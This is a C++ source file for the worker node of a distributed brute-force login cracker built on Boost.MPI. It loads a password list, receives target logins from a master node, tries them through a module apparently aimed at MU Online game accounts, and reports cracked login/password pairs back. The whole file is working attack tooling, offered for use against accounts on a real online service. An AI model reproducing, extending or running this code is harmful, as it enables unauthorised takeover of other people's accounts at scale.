#include "client.h"
#include "core_linear.h"
#include "mod_muonline.h"

#include <boost/mpi.hpp>
#include <boost/mpi/environment.hpp>
#include <boost/mpi/communicator.hpp>

#include <string>
#include <iostream>
#include <exception>

using namespace boost;
using namespace std;

CBruteClient::CBruteClient(boost::mpi::environment& e, boost::mpi::communicator& w) : 
	INode(e, w),
	_inited(false)
{
}

CBruteClient::~CBruteClient()
{
}

void CBruteClient::init()
{
	Configs cfg;
	uint32_t pool_size = 0, passwd_count = 0;

	_inited = false;

	broadcast(_world, cfg, 0);

	if (!cfg.IsInited())
		return;

	if (cfg.module == C_MOD_UNKNOWN)
		return;
	if (cfg.core == C_CORE_UNKNOWN)
		return;

	try {
		property_tree::ptree pt;
		property_tree::ini_parser::read_ini("config.ini", pt);
		string temp;

		// passwd list
		temp = pt.get<string>("Settings.file_passwords");
		_parser.Parse(temp);
		if (_parser.Count() == 0)
			throw std::exception("passwords list is empty");

		passwd_count = _parser.Count();

		// pool size
		pool_size = pt.get<uint32_t>("Settings.thread_pool_size");
		if (pool_size == 0)
			throw std::exception("pool size not set");

		// core settings
		if (cfg.module == C_MOD_MUONLINE)
			_module.reset(new CModMuonline());
		else
			throw std::exception("unknown module");

		_module->init(pt);

		if (cfg.core == C_CORE_LINEAR) {
			_core.reset(new CLinearCore(this, _module.get(), &_parser));
		} else
			throw std::exception("unknown module");

		_pool.create(pool_size, _core->thread_entry, reinterpret_cast<ICore*>(_core.get()));

		_inited = true;
	} catch (std::exception const& e) {
		cout << "[node #" << _world.rank() << "] init() exception: " << e.what() << endl;
	}
	
	if (_world.rank() == 1) {
		_world.send(0, 0, passwd_count);
	}

	debug("[node #" << _world.rank() << "] client init complete");
}

void CBruteClient::start()
{
	ServerStatus status = S_STATUS_FAIL;
	ClientRequest req = {(_inited ? C_REQ_REG : C_REQ_UNREG), 0};
	WorkInfo work;
	ApproveInfo approve;
	uint32_t rank = _world.rank();
	uint64_t counter;

	// register or unregister
	send_command(req, status);

	if (!_inited || status == S_STATUS_FAIL)
		return;

	debug("[node #" << rank << "] registred");

	for (uint32_t i = 0, count = _core->start_work_count(); i < count; i++)
		push_request(S_REQ_PUT_WORK);

	// worked loop
	_timer = 0;
	while (_pool.get_active_count() != 0) {
		check_counter();
		if (!pop_request(req)) {
			this_thread::sleep( posix_time::milliseconds(1) );
			continue;
		}

		switch (req.req) {
		case S_REQ_PUT_WORK: // get work
			
			send_command(req.set(C_REQ_WORK, 0), status);
			if (status == S_STATUS_FAIL) {
				debug("[node #" << rank << "] work request canceled");
				push_request(S_REQ_QUIT);
				break;
			}

			_world.recv(0, 2, work);

			if (_core->put_work(work)) {
				debug("[node #" << rank << "] work obtained (" << work.inx << ":" << work.login << ")");
			} else {
				debug("[node #" << rank << "] incorrect login (" << work.inx << ":" << work.login << ")");
				push_request(S_REQ_PUT_WORK);
			}

			break;

		case S_REQ_CANCEL: // cancel work request
			
			if (_core->cancel_work(req.val))
				debug("[node #" << rank << "] work canceled (index:" << req.val << ")");
			
			break;

		case S_REQ_COMPLETE: // login found

			_core->get_approved(approve);
			_core->cancel_work(approve.inx);

			debug("[node #" << rank << "] login founded " 
				<< "(index:" << approve.inx << " login:" << approve.login << " password:" << approve.passwd << ")");

			send_command(req.set(C_REQ_APPROVE, 0), status);
			_world.send(0, 2, approve);

			// next work
			push_request(S_REQ_PUT_WORK);

			break;

		case S_REQ_COUNTER: // send counter

			counter = _core->get_counter();
			send_command(req.set(C_REQ_COUNTER, 0), status);
			_world.send(0, 2, counter);

			break;

		case S_REQ_QUIT: // stop obtaining work

			if (_core->destroy()) {
				_pool.destroy();
				debug("[node #" << rank << "] node destroyed");
			}

			break;

		default:
			debug("[node #" << rank << "] unknown request " 
				<< "(request:" << req.req << " rank:" << req.val << ")");
			break;
		}
	}

	// unregister client
	send_command(req.set(C_REQ_UNREG, 0), status);
	debug("[node #" << _world.rank() << "] unregistred");
}

void CBruteClient::push_request(uint32_t req)
{
	lock_guard<mutex> guard(_sync);
	ClientRequest r = {req, 0};
	_requests.push(r);
}

bool CBruteClient::pop_request(ClientRequest& req)
{
	lock_guard<mutex> guard(_sync);

	optional<mpi::status> opt = _world.iprobe(0, 0);
	if (opt.is_initialized()) {
		_world.recv(0, 0, req);
		return true;
	}

	if (_requests.size() > 0) {
		req = _requests.front();
		_requests.pop();
		return true;
	}

	return false;
}

void CBruteClient::send_command(ClientRequest& req, ServerStatus& status)
{
	_world.send(0, 0, req);
	_world.recv(0, 1, status);
}

void CBruteClient::check_counter()
{
	time_t tm = time(NULL);
	if (tm - _timer < 25) {
		return;
	}
	_timer = tm;
	push_request(S_REQ_COUNTER);
}
